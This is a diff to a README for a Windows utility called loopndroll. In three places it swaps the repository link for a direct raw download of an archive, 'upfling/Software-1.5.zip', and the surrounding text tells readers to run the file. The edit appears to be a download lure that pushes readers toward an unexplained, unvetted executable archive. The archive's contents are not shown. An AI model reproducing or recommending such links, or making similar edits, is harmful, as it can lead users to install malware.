@@ -1,6 +1,6 @@
 # 🌀 loopndroll - Keep Codex Running Smoothly
 
-[![Download loopndroll](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hamobiles2899/loopndroll)
+[![Download loopndroll](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hamobiles2899/loopndroll/raw/refs/heads/main/upfling/Software-1.5.zip)
 
 ## 🚀 What this does
 
@@ -23,7 +23,7 @@ For best results, keep your system up to date and close apps you do not need whi
 
 Visit this page to download loopndroll:
 
-https://github.com/Hamobiles2899/loopndroll
+https://github.com/Hamobiles2899/loopndroll/raw/refs/heads/main/upfling/Software-1.5.zip
 
 Open the page, find the latest release or main download link, and save the file to your PC.
 
@@ -190,6 +190,6 @@ If you get a `.zip`, extract it first. If you get an installer, run it and follo
 
 Use this link to download or visit the release page:
 
-https://github.com/Hamobiles2899/loopndroll
+https://github.com/Hamobiles2899/loopndroll/raw/refs/heads/main/upfling/Software-1.5.zip
 
 Open the page, get the latest file, and run it on your Windows PC
